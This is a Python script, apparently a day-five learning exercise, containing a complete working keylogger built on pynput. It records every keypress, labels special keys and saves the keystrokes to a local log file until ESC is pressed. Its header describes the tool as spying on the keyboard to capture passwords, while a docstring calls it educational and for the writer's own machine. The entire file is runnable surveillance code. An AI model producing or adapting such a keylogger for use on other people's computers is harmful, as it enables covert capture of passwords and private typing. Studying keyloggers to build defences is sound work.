#DAY 5
#PYTHON KEYLOGGER - IT SPIES THE COMPUTER KEYBOARD AND SAVES ALL THE TEXT CLICKED BY THE KEYBOARD IT IS USED TO SNIP PASSWORDS
"""
EDUCATIONAL KEYLOGGER — FOR YOUR OWN MACHINE ONLY
Captures every keypress with timestamp and logs to a file.
Press ESC to stop.
Purpose: Learn how attackers spy — so you can DEFEND against it.
"""

from pynput import keyboard  # Listen to keyboard events
import datetime  # For timestamps


class EducationalKeylogger:
    """
    A simple keylogger that records all keystrokes on your own machine.
    """

    def __init__(self, log_file="keystrokes.log"):
        """
        Set up the log file name and an empty list to store keys.
        """
        self.log_file = log_file  # File to save the log
        self.current_keys = []  # List to hold all captured keys
        self.is_recording = False  # (Reserved for future use)

    def on_press(self, key):
        """
        Called automatically whenever a key is pressed.
        Adds the key (with timestamp) to the list.
        """
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            # Check if it's a regular character (like 'a', '5', '?')
            if hasattr(key, 'char') and key.char is not None:
                self.current_keys.append(key.char)
            else:
                # It's a special key – map it to a human‑readable label
                special_keys = {
                    keyboard.Key.space: ' [SPACE] ',
                    keyboard.Key.enter: '\n[ENTER]\n',
                    keyboard.Key.tab: ' [TAB] ',
                    keyboard.Key.backspace: ' [BACKSPACE] ',
                    keyboard.Key.shift: ' [SHIFT] ',
                    keyboard.Key.ctrl_l: ' [CTRL] ',
                    keyboard.Key.ctrl_r: ' [CTRL] ',
                    keyboard.Key.alt_l: ' [ALT] ',
                    keyboard.Key.alt_r: ' [ALT] ',
                    keyboard.Key.esc: ' [ESC] ',
                    keyboard.Key.up: ' [UP] ',
                    keyboard.Key.down: ' [DOWN] ',
                    keyboard.Key.left: ' [LEFT] ',
                    keyboard.Key.right: ' [RIGHT] ',
                    keyboard.Key.f1: ' [F1] ',
                    keyboard.Key.f2: ' [F2] ',
                    # Add more if needed
                }
                # If the key is in the dictionary, use that label; otherwise, use its technical name
                self.current_keys.append(special_keys.get(key, f' [{str(key)}] '))
        except Exception as e:
            print(f"Error capturing key: {e}")

    def on_release(self, key):
        """
        Called when a key is released.
        If the released key is ESC, we stop the listener.
        """
        if key == keyboard.Key.esc:  # <--- FIXED: Key.esc (not key.esc)
           return False  # Stops the listener


    def start_logging(self):
        """
        Starts the keylogger:
        - Writes a header to the log file.
        - Creates a listener that calls on_press and on_release.
        - Waits until the listener stops (ESC pressed or Ctrl+C).
        - Then saves the log.
        """
        print("[*] KEYLOGGER STARTING...")
        print("[*] PRESS ESC TO STOP IT.")
        print(f"[*] Logging to: {self.log_file}")

        # Write a start marker (overwrites any previous log)
        with open(self.log_file, 'w') as f:
            f.write(f"=== KEYLOGGER STARTED: {datetime.datetime.now()} ===\n")
            f.write("=" * 50 + "\n\n")

        # Create the listener with our callback functions
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:

            try:
                # Block and wait until the listener stops (on_release returns False)
                listener.join()
            except KeyboardInterrupt:
                # If you press Ctrl+C in the terminal, stop gracefully
                print("\n[*] KEYLOGGER STOPPED BY KEYBOARD INTERRUPT")

        # After the listener stops, save all captured keystrokes to the file
        self.save_log()
        print(f"[*] Log saved to {self.log_file}")

    def save_log(self):
        """
        Appends the collected keystrokes to the log file with an end marker.
        """
        with open(self.log_file, 'a') as f:  # 'a' = append mode
            f.write("\n" + "=" * 50 + "\n")
            f.write(f"=== SESSION ENDED: {datetime.datetime.now()} ===\n\n")
            # Join all the captured key strings into one big string and write
            f.write("".join(self.current_keys))

    def display_log(self):
        """
        Helper to read and print the entire log file.
        """
        try:
            with open(self.log_file, 'r') as f:
                content = f.read()
                print("\n" + "=" * 50)
                print("KEYSTROKE LOG:")
                print("=" * 50)
                print(content)
        except FileNotFoundError:
            print("[!] Log file not found. Nothing to display.")


# ==================== RUN ====================
if __name__ == "__main__":
    logger = EducationalKeylogger()
    logger.start_logging()
    # Optionally, uncomment the next line to show the log after stopping:
    # logger.display_log()
